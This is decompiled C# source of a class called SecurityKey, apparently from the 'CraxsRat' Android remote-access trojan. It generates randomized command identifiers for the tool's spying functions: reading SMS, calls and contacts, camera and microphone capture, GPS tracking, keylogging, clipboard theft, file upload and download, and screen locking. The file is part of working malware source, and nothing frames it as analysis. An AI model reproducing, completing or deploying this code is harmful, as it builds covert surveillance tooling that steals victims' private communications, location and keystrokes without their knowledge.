using System;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x020000BC RID: 188
[StandardModule]
internal sealed class SecurityKey
{
	// Token: 0x0600080C RID: 2060 RVA: 0x000BE948 File Offset: 0x000BCB48
	public static void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwejhga()
	{
		SecurityKey.getinfo = SecurityKey.Key();
		SecurityKey.Bing = SecurityKey.Key();
		SecurityKey.getCalls = SecurityKey.Key();
		SecurityKey.getContacts = SecurityKey.Key();
		SecurityKey.getCamera = SecurityKey.Key();
		SecurityKey.Lockscreen = "ddll";
		SecurityKey.getfiles = SecurityKey.Key();
		SecurityKey.getCommand = SecurityKey.Key();
		SecurityKey.getGSM = SecurityKey.Key();
		SecurityKey.getGPS = SecurityKey.Key();
		SecurityKey.down_info = SecurityKey.Key() + ">";
		SecurityKey.downByte = SecurityKey.Key() + ">";
		SecurityKey.upload_info = SecurityKey.Key();
		SecurityKey.uploadByte = SecurityKey.Key();
		SecurityKey.MicwaveOutByte = SecurityKey.Key();
		SecurityKey.ImageViewer = SecurityKey.Key() + ">";
		SecurityKey.Apps = SecurityKey.Key();
		SecurityKey.Account = SecurityKey.Key();
		SecurityKey.Information = SecurityKey.Key();
		SecurityKey.MicwaveinByte = SecurityKey.Key();
		SecurityKey.editor = SecurityKey.Key();
		SecurityKey.SHOT = SecurityKey.Key();
		SecurityKey.getUpdate = SecurityKey.Key();
		SecurityKey.Keylogger = SecurityKey.Key();
		SecurityKey.AppsProperties = SecurityKey.Key();
		SecurityKey.acquire = SecurityKey.Key();
		SecurityKey.getClipboard = SecurityKey.Key();
		SecurityKey.KeysClient1 = "1";
		SecurityKey.KeysClient2 = "2";
		SecurityKey.KeysClient3 = "3";
		SecurityKey.KeysClient4 = "4";
		SecurityKey.KeysClient5 = "5";
		SecurityKey.KeysClient6 = "6";
		SecurityKey.KeysClient7 = "7";
		SecurityKey.KeysClient8 = "8";
		SecurityKey.KeysClient9 = "9";
		SecurityKey.KeysClient10 = "10";
		SecurityKey.KeysClient11 = "11";
		SecurityKey.KeysGetClient = "-2";
		SecurityKey.resultClient = "-1";
	}

	// Token: 0x0600080D RID: 2061 RVA: 0x000BEB04 File Offset: 0x000BCD04
	public static string Key()
	{
		checked
		{
			SecurityKey.count++;
			return Conversions.ToString(SecurityKey.count) + SecurityKey.GenRandom(3) + Conversions.ToString(DateTime.Now.Millisecond);
		}
	}

	// Token: 0x0600080E RID: 2062 RVA: 0x000BEB48 File Offset: 0x000BCD48
	public static string GenRandom(int Length)
	{
		string text = null;
		string text2 = "qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJMIKOLP";
		checked
		{
			for (int i = 1; i <= Length; i++)
			{
				Thread.Sleep(5);
				Random random = new Random(DateAndTime.Now.Millisecond);
				text += Conversions.ToString(text2[random.Next(0, text2.Length)]);
			}
			return text;
		}
	}

	// Token: 0x04000B97 RID: 2967
	public static string getinfo;

	// Token: 0x04000B98 RID: 2968
	public static string getCalls;

	// Token: 0x04000B99 RID: 2969
	public static string getSMS;

	// Token: 0x04000B9A RID: 2970
	public static string getContacts;

	// Token: 0x04000B9B RID: 2971
	public static string getCamera;

	// Token: 0x04000B9C RID: 2972
	public static string Lockscreen;

	// Token: 0x04000B9D RID: 2973
	public static string getfiles;

	// Token: 0x04000B9E RID: 2974
	public static string Bing;

	// Token: 0x04000B9F RID: 2975
	public static string getCommand;

	// Token: 0x04000BA0 RID: 2976
	public static string getGSM;

	// Token: 0x04000BA1 RID: 2977
	public static string getGPS;

	// Token: 0x04000BA2 RID: 2978
	public static string getUpdate;

	// Token: 0x04000BA3 RID: 2979
	public static string down_info;

	// Token: 0x04000BA4 RID: 2980
	public static string downByte;

	// Token: 0x04000BA5 RID: 2981
	public static string upload_info;

	// Token: 0x04000BA6 RID: 2982
	public static string uploadByte;

	// Token: 0x04000BA7 RID: 2983
	public static string MicwaveOutByte;

	// Token: 0x04000BA8 RID: 2984
	public static string ImageViewer;

	// Token: 0x04000BA9 RID: 2985
	public static string Apps;

	// Token: 0x04000BAA RID: 2986
	public static string Account;

	// Token: 0x04000BAB RID: 2987
	public static string Information;

	// Token: 0x04000BAC RID: 2988
	public static string MicwaveinByte;

	// Token: 0x04000BAD RID: 2989
	public static string editor;

	// Token: 0x04000BAE RID: 2990
	public static string SHOT;

	// Token: 0x04000BAF RID: 2991
	public static string Keylogger;

	// Token: 0x04000BB0 RID: 2992
	public static string AppsProperties;

	// Token: 0x04000BB1 RID: 2993
	public static string acquire;

	// Token: 0x04000BB2 RID: 2994
	public static string getClipboard;

	// Token: 0x04000BB3 RID: 2995
	public static string KeysClient1;

	// Token: 0x04000BB4 RID: 2996
	public static string KeysClient2;

	// Token: 0x04000BB5 RID: 2997
	public static string KeysClient3;

	// Token: 0x04000BB6 RID: 2998
	public static string KeysClient4;

	// Token: 0x04000BB7 RID: 2999
	public static string KeysClient5;

	// Token: 0x04000BB8 RID: 3000
	public static string KeysClient6;

	// Token: 0x04000BB9 RID: 3001
	public static string KeysClient7;

	// Token: 0x04000BBA RID: 3002
	public static string KeysClient8;

	// Token: 0x04000BBB RID: 3003
	public static string KeysClient9;

	// Token: 0x04000BBC RID: 3004
	public static string KeysClient10;

	// Token: 0x04000BBD RID: 3005
	public static string KeysClient11;

	// Token: 0x04000BBE RID: 3006
	public static string KeysGetClient;

	// Token: 0x04000BBF RID: 3007
	public static string resultClient;

	// Token: 0x04000BC0 RID: 3008
	private static int count;
}
